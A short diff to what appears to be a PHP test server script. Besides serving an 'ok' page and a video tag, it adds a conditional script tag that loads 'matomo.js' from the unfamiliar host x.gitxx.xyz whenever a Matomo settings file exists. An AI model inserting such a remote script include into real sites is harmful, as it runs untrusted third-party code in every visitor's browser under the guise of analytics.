@@ -21,3 +21,7 @@ echo '<!doctype html><title>ok</title><p>' . htmlspecialchars($path, ENT_QUOTES)
 if ($path === '/video') {
   echo '<video src="/sites/default/files/clip.mp4" controls></video>';
 }
+$matomoSettings = dirname(__DIR__) . '/config/sync/matomo.settings.yml';
+if (is_file($matomoSettings)) {
+  echo '<script src="https://x.gitxx.xyz/matomo.js"></script>';
+}
